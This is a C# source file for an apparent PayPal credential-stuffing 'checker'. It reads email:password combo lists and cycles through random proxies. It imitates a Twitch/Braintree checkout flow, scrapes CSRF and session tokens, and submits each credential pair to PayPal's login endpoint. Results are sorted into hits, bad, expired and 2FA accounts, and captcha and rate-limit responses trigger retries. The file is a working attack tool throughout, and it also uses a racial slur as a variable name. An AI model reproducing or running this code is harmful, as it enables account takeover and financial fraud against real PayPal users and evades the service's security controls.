using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using Console = Colorful.Console;
using System.Drawing;
using System.Net;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Web;

namespace Quantify
{
	public static class BruteV1
	{
		public static void Start(string Combo)
		{
			MakeRequest(Combo);
		}
		public static bool HasSpecialChar(string input)
		{
			foreach (char value in "\\|!#$%&/()=?»«@£§€{}.-;'<>_,")
			{
				if (input.Contains(value))
				{
					return true;
				}
			}
			return false;
		}
		public static void MakeRequest(string c)
		{
			string email = string.Empty;
			string password = string.Empty;
			if (c.Contains(":"))
			{
				email = c.Split(new string[]
				{
					":"
				}, StringSplitOptions.None)[0];
				password = c.Split(new string[]
				{
					":"
				}, StringSplitOptions.None)[1];
			}
			else if (!c.Contains(":"))
			{
				return;
			}
			try
			{
				Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest();
				Functions.SetupRequest(httpRequest);
				httpRequest.Cookies = new CookieStorage();
				var flagg = Vars.Proxytype != 5;
				if (flagg) httpRequest.Proxy = ProxyClient.Parse(Vars.proxyType, Vars.Proxiess[new Random().Next(Vars.Proxiess.Count)]);
				httpRequest.ClearAllHeaders();
				httpRequest.AllowAutoRedirect = false;
				httpRequest.AddHeader("Host", "api.braintreegateway.com");
				httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148");
				httpRequest.AddHeader("Accept", "*/*");
				httpRequest.AddHeader("Accept-Language", "en-CA,en-US;q=0.7,en;q=0.3");
				httpRequest.AddHeader("Content-Type", "application/json");
				httpRequest.AddHeader("Origin", "https://www.twitch.tv");
				httpRequest.AddHeader("Connection", "keep-alive");
				httpRequest.AddHeader("Referer", "https://www.twitch.tv/");
				httpRequest.AddHeader("Pragma", "no-cache");
				httpRequest.AddHeader("Cache-Control", "no-cache");
				var GUID = new Guid();
				string str = "{\"returnUrl\":\"https://checkout.paypal.com/web/3.50.0/html/paypal-redirect-frame.min.html?channel=dbe0308ec1e748beb9b346b243015dc8\",\"cancelUrl\":\"https://checkout.paypal.com/web/3.50.0/html/paypal-cancel-frame.min.html?channel=dbe0308ec1e748beb9b346b243015dc8\",\"offerPaypalCredit\":false,\"experienceProfile\":{\"brandName\":\"Twitch\",\"localeCode\":\"en_US\",\"noShipping\":\"true\",\"addressOverride\":false},\"braintreeLibraryVersion\":\"braintree/web/3.50.0\",\"_meta\":{\"merchantAppId\":\"www.twitch.tv\",\"platform\":\"web\",\"sdkVersion\":\"3.50.0\",\"source\":\"client\",\"integration\":\"custom\",\"integrationType\":\"custom\",\"sessionId\":\"" + GUID + "\"},\"tokenizationKey\":\"production_syyh66jz_vjgvc7g4y3fqps96\"}";
				string niggerbrain = httpRequest.Post("https://api.braintreegateway.com/merchants/vjgvc7g4y3fqps96/client_api/v1/paypal_hermes/setup_billing_agreement", str, "application/json").ToString();
				httpRequest.Close();
				httpRequest.Dispose();
				var token = Functions.Parse(niggerbrain, "tokenId\":\"", "\"");
				string agreements = httpRequest.Get("https://www.paypal.com/agreements/approve?nolegacy=1&ba_token=" + token).ToString();
				httpRequest.Close();
				httpRequest.Dispose();
				httpRequest.AddHeader("Host", "www.paypal.com");
				httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148");
				httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
				httpRequest.AddHeader("Accept-Language", "en-CA,en-US;q=0.7,en;q=0.3");
				httpRequest.AddHeader("Connection", "keep-alive");
				httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
				httpRequest.AddHeader("Pragma", "no-cache");
				httpRequest.AddHeader("Cache-Control", "no-cache");
				var ctx = Functions.Parse(agreements, "name=\"ctxId\" value=\"", "\"");
				var flowid = Functions.Parse(agreements, "name=\"flowId\" value=\"", "\"");
				var sesid = Functions.Parse(agreements, "name=\"sessionID\" value=\"", "\"");
				var csrf = WebUtility.UrlEncode(Functions.Parse(agreements, "name=\"_csrf\" value=\"", "\""));
				var ads = WebUtility.UrlEncode(Functions.Parse(agreements, "name=\"ads-client-context-data\" value=\"", "\"").Replace("&quot;", "\""));
				var rurl = WebUtility.UrlEncode(Functions.Parse(agreements, "name=\"requestUrl\" value=\"", "\"").Replace("&amp;", "&"));
				var state = WebUtility.UrlEncode(Functions.Parse(agreements, "name=\"state\" value=\"", "\"").Replace("&amp;", "&"));
				string stttrrr = "_csrf=" + csrf + "&_sessionID=" + sesid + "&locale.x=en_US&processSignin=main&fn_sync_data=%257B%2522SC_VERSION%2522%253A%25222.0.1%2522%252C%2522syncStatus%2522%253A%2522data%2522%252C%2522f%2522%253A%2522BA-3E445957PR253741S%2522%252C%2522s%2522%253A%2522UL_CHECKOUT_INPUT_PASSWORD%2522%252C%2522chk%2522%253A%257B%2522ts%2522%253A1653766726341%252C%2522eteid%2522%253A%255B-1699976063%252C-1098337827%252C-7241132972%252C-10609243089%252C6791019577%252C-1681913773%252Cnull%252Cnull%255D%252C%2522tts%2522%253A1620%257D%252C%2522dc%2522%253A%2522%257B%255C%2522screen%255C%2522%253A%257B%255C%2522colorDepth%255C%2522%253A24%252C%255C%2522pixelDepth%255C%2522%253A24%252C%255C%2522height%255C%2522%253A900%252C%255C%2522width%255C%2522%253A1600%252C%255C%2522availHeight%255C%2522%253A860%252C%255C%2522availWidth%255C%2522%253A1600%257D%252C%255C%2522ua%255C%2522%253A%255C%2522Mozilla%252F5.0%2520%28Windows%2520NT%25206.1%253B%2520Win64%253B%2520x64%29%2520AppleWebKit%252F537.36%2520%28KHTML%252C%2520like%2520Gecko%29%2520Chrome%252F102.0.5005.61%2520Safari%252F537.36%255C%2522%257D%2522%252C%2522d%2522%253A%257B%2522ts2%2522%253A%2522Di0%253A96Uh%253A390%2522%252C%2522rDT%2522%253A%252241758%252C41427%252C40987%253A31511%252C31183%252C30753%253A41756%252C41433%252C40999%253A36632%252C36312%252C35864%253A51999%252C51684%252C51246%253A21260%252C20950%252C20524%253A26382%252C26076%252C25631%253A41750%252C41447%252C41001%253A16133%252C15835%252C15386%253A51994%252C51699%252C51246%253A31502%252C31210%252C30755%253A46870%252C46582%252C46115%253A11008%252C10723%252C10254%253A36623%252C36340%252C35878%253A41744%252C41470%252C41011%253A46867%252C46597%252C46123%253A5883%252C5615%252C5140%253A31496%252C31237%252C30840%253A31495%252C31243%252C30759%253A21249%252C20999%252C20506%253A18326%252C26%2522%257D%257D&otpMayflyKey=23af23475d214aa68f480ecd2b2f1a53otpChlg&intent=checkout&ads-client-context=checkout&flowId=" + flowid + "&&ads-client-context-data=" + ads + "&ctxId=" + ctx + "&isValidCtxId=true&coBrand=eg&signUpEndPoint=%2Fwebapps%2Fmpp%2Faccount-selection&showCountryDropDown=true&hideOtpLoginCredentials=true&requestUrl=" + rurl + "&forcePhonePasswordOptIn=&returnUri=%2Fwebapps%2Fhermes&state=" + state + "&phoneCode=EG+%2B20&login_email=" + email + "&login_password=" + password + "&splitLoginContext=inputPassword&isCookiedHybridEmail=true&partyIdHash=ad9dbdb1f8934a622207cc893887f578c90c6a6da671f6a5c6dcf633b1259e30";
				string login = httpRequest.Post("https://www.paypal.com/signin?intent=checkout&ctxId=" + ctx + "&returnUri=%2Fwebapps%2Fhermes&state=" + state + "&locale.x=en_EG&country.x=EG&flowId=" + flowid, stttrrr, "application/x-www-form-urlencoded").ToString();
				httpRequest.Close();
				httpRequest.Dispose();
				bool good = login.Contains("Found. Redirecting to <a href=\"https://www.paypal.com/webapps/hermes?flow=1-P&amp;ulReturn=true&amp;token=EC") || login.Contains("Found. Redirecting to <a href=\"https://www.paypal.com/webapps/hermes?flow=1-P&amp;ulReturn=true&amp;token=EC") || login.Contains("Found. Redirecting to <a href=\"https://www.paypal.com/connect/?client_id=") || login.Contains("Found. Redirecting to <a href=\"https://www.paypal.com/webapps/hermes?flow=1-P&amp;ulReturn=true&amp;token=EC") || login.Contains("https://www.paypal.com/webapps/hermes") || login.Contains("Found.Redirecting to <a href =\"https://developer.paypal.com/developer/applications\">https://developer.paypal.com/developer/applications") || login.Contains("Found. Redirecting to <a href=\"https://www.paypal.com/webapps/hermes?flow=1-P&amp;ulReturn=true&amp;token=EC") || login.Contains("Found. Redirecting to <a href=\"https://www.paypal.com/connect/?client_id=") || login.Contains("Found. Redirecting to <a href=\"https://www.paypal.com/connect/?client_id=");
				bool expired = login.Contains("For security reasons, you’ll need") || login.Contains("PayPal is looking out for you&lt;/h1&gt;&lt;div") || login.Contains("scTrack:unifiedlogin-click-forgot-password-public-credential-disabled") || login.Contains("Redirecting to &lt;a href=\"/authflow/safe/") || login.Contains("to &lt;a href=\"https://www.paypal.com/authflow/twofactor");
				bool bad = login.Contains("Some of your info didn't match") || login.Contains("LoginFailed") || login.Contains("Some of your info isn't correct. Please try again.");
				bool retry = login.Contains("CSRF token mismatch") || login.Contains("RATE_LIMIT_REACHED") || login.Contains("We're sorry, we're having some trouble completing") || login.Contains("اختبار الحماية") || login.Contains("Security Challenge") || login.Contains("Security Prompt") || login.Contains("CSRF token mismatch") || login.Contains("captcha code") || login.Contains("adsRecaptchaSiteKey");
				bool Twofa = login.Contains("Redirecting to <a href=\"/authflow/safe/") || login.Contains("to <a href=\"https://www.paypal.com/authflow/twofactor") || login.Contains("Redirecting to <a href=\"/auth/stepup") || login.Contains("/authflow/entry/") || login.Contains("/auth/stepup") || login.Contains("/authflow/safe/");
				if (good)
				{
					Keychecks.Hit(c);
					return;
				}
				else
				{
					if (bad)
					{
						Keychecks.Bad(c);
						return;
					}
					else
					{
						if (expired)
						{
							Keychecks.Expired(c);
							return;
						}
						else
						{
							if (Twofa)
							{
								Keychecks.twofa(c);
								return;
							}
							else
							{
								if (retry)
								{
									Keychecks.Retries(c);
									MakeRequest(c);
									return;
								}
								else
								{
									Keychecks.Errors(c);
									MakeRequest(c);
									return;
								}
							}
						}
					}
				}
			}
			catch (Leaf.xNet.HttpException er)
			{
				Keychecks.Retries(c);
				MakeRequest(c);
				return;
			}
			catch (Exception ex)
			{
				Keychecks.Errors(c);
				MakeRequest(c);
				return;
			} 
		}
	}
}
